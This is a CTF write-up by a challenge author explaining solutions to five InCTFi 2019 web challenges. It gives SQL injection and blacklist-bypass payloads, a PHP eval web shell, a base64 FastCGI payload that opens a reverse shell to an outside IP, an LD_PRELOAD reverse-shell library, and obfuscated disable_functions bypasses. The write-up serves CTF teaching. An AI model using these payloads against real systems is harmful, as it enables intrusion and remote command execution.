---
title: Web writeups - InCTF Internationals 2019
date: 2019-10-16 14:09:44
author: SpyD3r
author_url: https://twitter.com/TarunkantG
categories:
  - Web Exploitation
tags:
  - InCTFi
  - Gopherus
  - SSRF
  - PHP
---

Hey, I am SpyD3r([TarunkantG](https://twitter.com/TarunkantG)) and In this blog I will be discussing all the 5 web challenges that I made for InCTFi 2019 and a lot of SQLi and bypassing disable_functions tricks.    
<!--more-->

The first challenge was Copy-Cat which had 3 solves, second challenge was GoSQLv2 which got 2 solves and the other challenge were based on PHP-internals from which PHP+2 got least solves that is 1.  

## GoSQLv2
This challenge was next version of last year's GoSQL, you can take look at the writeup [here](https://spyclub.tech/2018/10/08/2018-10-08-inctf2018-web-challenge-writeup/). This time, this challenge wasn't that hard because you knew what to do and how to go forward in the challenge, So only thing you need to do exploit **SQLi(2 times)+SSRF+bypass disable_functions** and finally you need to get RCE. Before reading this writeup I suggest you to read last year [writeup](https://spyclub.tech/2018/10/08/2018-10-08-inctf2018-web-challenge-writeup/) first.  
This challenge is not much different from the last year, only thing is, this time you have to use different SQL tricks to get admin and the different exploit to get database `user()`. Then same SSRF (using [Gopherus](https://github.com/tarunkant/Gopherus)) then finally need to bypass disable_functions to get RCE.
So the first thing I hope you did was `diff` didn't you?  
Yeah, same thing I would have done and that was the right way to do it. So when you `diff` you will get to know that you can't use `UTF-8` charset (So last year trick won't work ;). And these things which were blocked earlier, this time not:
```
|-|0|'|
```
And these things which were **not** blocked earlier, this time extra added:
```
|ad|min|\|0b|0x|having|insert|decode|in|sleep|>|exp|
```
So as you can see we can use Single Quote( ' ), and for commenting ( - ) is it only used for commenting??
### Trick-1
```sql
select * from login where username=''-sleep(1);
```
![a](blog4.0.png)

This will sleep for number of entries in the database (in this case 12 sec).  
So that's how you can dump the database, but here you can't use `sleep` because it is also blacklisted. So the main idea is here you can execute SQL commands after putting `-`.

For getting `admin` you don't have to do anything much, just needed to concatenate strings.
### Trick-2
```sql
select * from login where username='t' 'a' 'r' 'u' 'n' 'k' 'a' 'n' 't';
```
![a](blog4.1.png)

So the final payload I used to get admin was:
```
/?name=a%27%0a%27d%27%0a%27m%27%0a%27i'%0a'n
```

Now you need to find another SQLi to get `mysql_user` How?  
By taking the advantage of this:
```php
}
  else{
      echo "<h4>You are not admin " . "</h4>";
  }
}
else{
  echo "<h4>Having a query problem" . "</h4><br>";
}
```
We will make MySQL to return some time `query problem` and some time `not admin`, and doing that we can get `mysql_user`.  

### Trick-3
```sql
select * from login where username=''-(~(select 1=1)+1);  
# This will return empty string, and hence it will return `You are not admin`
select * from login where username=''-(~(select 1=2)+1);  
# This will return error
```
![a](blog4.2.png)

Now you know how to bypass that only you need to find alternatives of blacklisted keywords. So instead of `=` you could have used `<`, for space `%0a`.  

### Trick-4
```sql
select 'root'>'a';  # Will return True
select 'root'>'s';  # Will return False
```
![a](blog4.3.png)

Like that you can bruteforce and get whole string.

The **full script** for finding the username can be found [here](https://github.com/tarunkant/CTF/blob/master/InCTF2019/GoSQLv2/InCTF19-GoSQLv2.py).  

There was one unintended, that I wanted to discuss, one of my teammate([@\_\_c3rb3ru5__](https://twitter.com/__c3rb3ru5__)) found that during challenge **testing phase**(that's why testing is important ;)). That trick was really mind-fucking.
```sql
select * from users where username='a' 'dm' 'in'>(user()>'s');
```
Here if it true you will get redirected else it will return `You are not admin`. Using that you can dump the user. That's why I had to blacklist `>`, because my payload can also work with `<` ;)  

Now we go into the second phase of the challenge, that is SSRF + bypass disable_functions to get RCE.  

The first few steps are same as last year, get to know the user_privileges and read the mysql conf file, using that write the shell payload at `URL/tmp_hell`. These things you can do using [Gopherus](https://github.com/tarunkant/Gopherus). There you can see that you will not able to execute the `system` commands, because of disable_function. So next thing you would do is to run `phpinfo()` and you will see the list of disable_function:
```
pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,stream_socket_sendto,stream_socket_client,pcntl_async_signals,error_log,system,exec,shell_exec,popen,proc_open,passthru,link,symlink,syslog,imap_open,ld,mail,file_put_contents,scandir,file_get_contents,readfile,fread,fopen,chdir
```
and open_basedir:
```
open_basedir = "/var/www/html:/tmp/test1"
```
### Trick-5
Bypass open_basedir using:
```
$file_list = array(); $it = new DirectoryIterator("glob:///va?/ru?/p?p//*"); foreach($it as $f) { $file_list[] = $f->__toString(); } echo 1234; $it = new DirectoryIterator("glob:///va?/ru?/p?p/.*"); foreach($it as $f) { $file_list[] = $f->__toString(); } sort($file_list); foreach($file_list as $f){ echo $f . "\n"; }
```
Thanks to [balsn-writeup](https://balsn.tw/ctf_writeup/20190323-0ctf_tctf2019quals/#wallbreaker-easy).

There you can find php-fpm unix socket file which gives you the idea that there is PHP-FPM installed in the server.  
Now you need to poison the request to the unix socket to get the shell. You can use `fsockopen` for writing in the socket file. Payload you can generate from [Gopherus](https://github.com/tarunkant/Gopherus), and make sure you don't use default file name, use `/var/www/html/index.php` instead.  
The payload for getting shell:
```
$fp%20=%20fsockopen("unix:///var/run/php/php7.0-fpm.sock",%20-1,%20$errno,%20$errstr,%2030);%20fwrite($fp,base64_decode("AQEAAQAIAAAAAQAAAAAAAAEEAAEBBQUADxBTRVJWRVJfU09GVFdBUkVnbyAvIGZjZ2ljbGllbnQgCwlSRU1PVEVfQUREUjEyNy4wLjAuMQ8IU0VSVkVSX1BST1RPQ09MSFRUUC8xLjEOA0NPTlRFTlRfTEVOR1RIMTAxDgRSRVFVRVNUX01FVEhPRFBPU1QJS1BIUF9WQUxVRWFsbG93X3VybF9pbmNsdWRlID0gT24KZGlzYWJsZV9mdW5jdGlvbnMgPSAKYXV0b19wcmVwZW5kX2ZpbGUgPSBwaHA6Ly9pbnB1dA8XU0NSSVBUX0ZJTEVOQU1FL3Zhci93d3cvaHRtbC9pbmRleC5waHANAURPQ1VNRU5UX1JPT1QvAAAAAAABBAABAAAAAAEFAAEAZQQAPD9waHAgc3lzdGVtKCdiYXNoIC1jICJzaCAtaSA%2BJiAvZGV2L3RjcC8zLjE1LjI1NS4yNC8xMjM0IDA%2BJjEiJyk7ZGllKCctLS0tLU1hZGUtYnktU3B5RDNyLS0tLS0KJyk7Pz4AAAAA"));
```

## Copy-Cat
This was code-review challenge, the challenge story was: There is a website and admin can only login from his office, for making the admin to work from home too, the website developer also implemented a way so that, the admin can also open the website from any other places.  
So, the task was to hack that implementation and be admin (However, it is the 1st part of the challenge).  
### Bypass SQLi
```php
function escape($str){
    global $conn;
    $str = $conn->real_escape_string($str);
    return $str;
}

function check($tocheck){
  $tocheck = trim(escape($tocheck));
  if(strlen($tocheck)<5){
    die("For God Sake, don't try to HACK me!!");
  }
  if(strlen($tocheck)>11){
    $tocheck = substr($tocheck, 0, 11);
  }
  return $tocheck;
}
```
Here you have to crack the `check` function, as this function doing escape and then substr to take first 11 character, you can abuse that to bypass SQL injection.
```
Username: 1111111111\
Password: or 1=1-- -
```
The escape function will make this username to `1111111111\\`, but substr will take only 11 character, which made vulnerable this function.  
After login, you can see the message saying that, you have to proove that you are admin. This time it checks if the user came from `127.0.0.1` or not!
```php
$remote_admin = create_function("",'if(isset($_SERVER["HTTP_I_AM_ADMIN"])){$_SERVER["REMOTE_ADDR"] = $_SERVER["HTTP_I_AM_ADMIN"];}');

$random = bin2hex(openssl_random_pseudo_bytes(32));

eval("function admin_$random() {"
  ."global \$remote_admin; \$remote_admin();"
  ."}");

send($random);

$_GET['random']();
```
### Trick-6
`create_function` creates `lamda` function known as Anonymous functions.  
![a](blog4.4.png)

Using this you need to bypass this stage, [here](https://github.com/tarunkant/CTF/blob/master/InCTF2019/Copy-Cat/exploit1.py) you can get the exploit script for doing the same.

Now admin has the functionality to import zip file, and our game server will extract the non-malicious files.  

#### Intended Step for this stage:
```php
function ExtractZipFile($file,$path){
  $zip = new ZipArchive;
  if ($zip->open($file) === TRUE) {
    $zip->extractTo($path);
    $zip->close();
}
}

function CheckDir($path) {
    $files = scandir($path);
    foreach ($files as $file) {
        $filepath = "$path/$file";
        if (is_file($filepath)) {
            $parts = pathinfo($file);
            $ext = strtolower($parts['extension']);
            if (strpos($ext, 'php') === false &&
                strpos($ext, 'pl') === false &&
                strpos($ext, 'py') === false &&
                strpos($ext, 'cgi') === false &&
                strpos($ext, 'asp') === false &&
                strpos($ext, 'js') === false &&
                strpos($ext, 'rb') === false &&
		strpos($ext, 'htaccess') === false &&
                strpos($ext, 'jar') === false) {
                @chmod($filepath, 0666);
            } else {
                @chmod($filepath, 0666);    // just in case the unlink fails for some reason
                unlink($filepath);
            }
        } elseif ($file != '.' && $file != '..' && is_dir($filepath)) {
            CheckDir($filepath);
        }
    }
}
```
`CheckDir` is the function to check and remove malicious files. And `ExtractZipFile` functions will extract the files from zip. So, let's see how these functions are called.
```php
ExtractZipFile($_FILES['file']['tmp_name'], $SANDBOX);
CheckDir($SANDBOX);
```
Do you see the problem here? **Race-Condition**. So using the Race Condition you can execute PHP files before it gets deleted, so you can see that it's too much unstable. Not everytime for running a PHP code I can make race-codition.  
So we need to find a stable method from where you can quey PHP codes.  
So here is the idea, what if you can put file in parent directory because the function `CheckDir` checks for malicious file in current directory(recursively).
```php
$payload = '<?php eval($_GET[\'cmd\']); ?> ';
file_put_contents("../a.php",$payload);
```
So putting this file using Race-Condition will give us to execute PHP codes.

#### Unintended Step for the same stage:
The unintended was to upload `.pht` files because server treats them as `php` file.

**Now from both ways you can create a stable file from where you can execute PHP code.**

If you see the `phpinfo()`, you can see the disable_function list:
```
pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,error_log,system,exec,shell_exec,popen,proc_open,passthru,link,symlink,syslog,imap_open,ld,mail,fread,fopen,file_get_contents,readfile,chdir
```

Here, you can see that `putenv` is not there, but all the majorly known function like, `error_log` and `mail` are blocked. And also PHP-Imagick library is not there.  
But there is function which works same as `mail` is `mb_send_mail` (For this to be working `mbstring` module should be there).  
This function came up when I was fuzzing the php-functions to see which all functions calls execve internally. We(I and [@\_\_c3rb3ru5__](https://twitter.com/__c3rb3ru5__)) implemented a **dumb** fuzzer for that. We will be releasing a blog soon with the result of our small research.  

So final exploit:
```php
#For getting consistent php code execution
$payload = '<?php eval($_GET[\'cmd\']); ?> ';
file_put_contents("../a.php",$payload);

#For bypassing disable_function and getting RCE
rename("./exploit.txt","/tmp/exploit.txt");

chmod("/tmp/exploit.txt",0755);
putenv("LD_PRELOAD=/tmp/exploit.txt");
mb_send_mail('a','a','a','a');

```
The exploit.c file:
```c
#include <unistd.h>
#include <sys/types.h>
#include <stdio.h>
#include <stdlib.h>

uid_t getuid(void){
	unsetenv("LD_PRELOAD");
	system("bash -c \"sh -i >& /dev/tcp/127.0.0.1/1234 0>&1\"");
	return 1;
}
```

You can get here the exploit for Race-Condition [here](https://github.com/tarunkant/CTF/blob/master/InCTF2019/Copy-Cat/exploit2.py).

## PHP Series
The PHP series was related to PHP-internals.
### PHP+1
In this challenge I didn't check if the input contains the blacklisted keyword.  
If you check for disable_functions, you will found that `proc_open` was unblocked.  
So there can be several solutions for this stage, here is one:
```
$x=(ch).(r);$k=$x(95);$l=$x(47);$a=(pr).(oc).$k.(op).(en);$b=($l.readFlag);$c=(p).(i).(pe);$d=r;$e=w;$f=(p).(i).(pes);$g=(pri).(nt).$k.(r);$h=(str).(eam).$k.(ge).(t).$k.(con).(tents);$i=(arra).(y).$k.(sh).(ift);$j=(arra).(y).$k.(sl).(ice);$z=$a($b,array(array($c,$d),array($c,$e),array($c,$e)),$$f);$g($h($i($j($$f,1,2))));
```
### PHP+1.5
Here the blacklist check was being done, but no check on length of input. So again:
```
$x=(ch).(r);$k=$x(95);$l=$x(47);$a=(pr).(oc).$k.(op).(en);$b=($l.readFlag);$c=(p).(i).(pe);$d=r;$e=w;$f=(p).(i).(pes);$g=(pri).(nt).$k.(r);$h=(str).(eam).$k.(ge).(t).$k.(con).(tents);$i=(arra).(y).$k.(sh).(ift);$j=(arra).(y).$k.(sl).(ice);$z=$a($b,array(array($c,$d),array($c,$e),array($c,$e)),$$f);$g($h($i($j($$f,1,2))));
```
### PHP+2
In this challenge the `proc_open` was blocked. This challenge was based on 1day exploit, you can see the actual PoC [here](https://bugs.php.net/bug.php?id=77843).<br> You can also get the exploit code [here](https://github.com/mm0r1/exploits/tree/master/php-json-bypass) (Thanks to OpenToAll for this). OpenToAll was the only team to solve this challenge.

If you are wondering how we can put this big file under the given condition of length constraint, here is the snippet:
```python
def e(s):
    return ''.join([chr(ord(c) ^ 0xff) for c in s]) + '^' + '\xff' * len(s)

p = '$p=%s;' % e('_POST')
p += '$l=%s;$n=%s;$m=$n(%s,$l($$p));$m();' % (e('current'), e('create_function'), e('$x'))
```

### PHP+2.5
In this challenge `prroc_open` was unblocked. The intended solution was to find a Segmentation Fault, and using that upload the file and using Race-Condition get the shell.  
If you are not familiar with this, RCE through Segfault+LFI, you can read [this blog](https://spyclub.tech/2018/12/21/one-line-and-return-of-one-line-php-writeup/).  
As of my PoC, you can visit to this [bug](https://bugs.php.net/bug.php?id=78583).  

The unintended solution was to find a working payload which is less than 100 length and that we found in PHP+2 itself.


I hope you get fun solving my InCTF challenges and may this blog help you to understand the challenge solutions.

